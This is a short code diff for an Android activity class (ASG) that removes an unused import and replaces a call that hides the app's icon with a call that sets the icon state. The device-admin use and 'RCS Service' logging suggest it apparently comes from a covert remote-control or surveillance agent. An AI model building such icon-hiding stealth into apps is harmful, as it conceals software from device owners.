@@ -14,7 +14,6 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -155,7 +154,7 @@ public class ASG extends Activity {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
 				}
-				Status.hideIcon();
+				Status.setIconState(true);
 			}
 
 		} catch (final SecurityException se) {
